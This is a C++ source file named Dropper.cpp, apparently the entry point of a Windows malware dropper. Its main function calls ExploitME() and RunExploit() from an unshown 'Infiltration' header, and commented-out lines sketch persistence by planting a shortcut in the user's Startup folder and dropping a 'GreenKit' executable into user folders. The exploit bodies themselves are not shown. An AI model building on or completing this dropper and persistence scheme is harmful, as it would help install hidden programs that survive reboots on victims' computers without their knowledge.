// Dropper.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
#include "Dropper.h"
#include "Infiltration.h"

#define MAX_LOADSTRING 100

// Global Variables:
HINSTANCE hInst;								// current instance
TCHAR szTitle[MAX_LOADSTRING];					// The title bar text
TCHAR szWindowClass[MAX_LOADSTRING];			// the main window class name

// Forward declarations of functions included in this code module:
ATOM				MyRegisterClass(HINSTANCE hInstance);
BOOL				InitInstance(HINSTANCE, int);
LRESULT CALLBACK	WndProc(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK	About(HWND, UINT, WPARAM, LPARAM);

int APIENTRY _tWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPTSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(lpCmdLine);

 	// TODO: Place code here.
	//%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\_greenkit_GreentKitExe.lnk");

	ExploitME();
	Sleep(1000);
	//wchar_t pathobj[MAX_PATH];
	//mbstowcs(pathobj, "%userprofile%\\Documents\\HAHA.txt", MAX_PATH);//"%userprofile%\\Documents\\_greenkit_folder\\_greenkit_GreenKitExe.exe", MAX_PATH);
	//CreateLink(pathobj, "C:\\yolo.lnk", NULL);
	//CreateDesktopShortcut("yolo", "%userprofile%\\Documents\\HAHA.txt");//"%userprofile%\\Documents\\_greenkit_folder\\_greenkit_GreenKitExe.exe");
	//create_shortcut("%userprofile%\\Documents\\HAHA.txt", "%userprofile%\\Documents\\coucou.lnk");
	Sleep(1000);
	RunExploit();

	return 0;
}

